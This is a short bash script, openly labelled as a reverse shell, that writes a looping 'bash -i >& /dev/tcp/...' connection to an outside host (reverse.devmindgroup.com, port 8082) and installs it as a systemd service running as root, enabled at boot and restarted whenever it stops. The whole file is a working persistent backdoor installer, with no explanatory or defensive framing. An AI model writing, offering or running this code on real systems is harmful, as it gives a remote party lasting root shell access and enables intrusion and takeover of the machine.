#!/bin/bash

# Variables
SERVICE_NAME="reverse_shell"
REMOTE_SERVER="reverse.devmindgroup.com"
REMOTE_PORT="8082"

# Create the reverse shell script
echo "Creating reverse shell script..."
cat <<EOF > /usr/local/bin/$SERVICE_NAME.sh
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/$REMOTE_SERVER/$REMOTE_PORT 0>&1
    sleep 10
done
EOF

# Make the script executable
chmod +x /usr/local/bin/$SERVICE_NAME.sh

# Create the systemd service file
echo "Creating systemd service..."
cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=Reverse Shell Connection
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/$SERVICE_NAME.sh
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd, enable, and start the service
echo "Reloading systemd manager configuration..."
sudo systemctl daemon-reload

echo "Enabling the reverse shell service..."
if sudo systemctl enable $SERVICE_NAME.service; then
    echo "Service enabled successfully."
else
    echo "Failed to enable the service."
    exit 1
fi

echo "Starting the reverse shell service..."
if sudo systemctl start $SERVICE_NAME.service; then
    echo "Service started successfully."
else
    echo "Failed to start the service."
    exit 1
fi

echo "Reverse shell service has been set up and started."
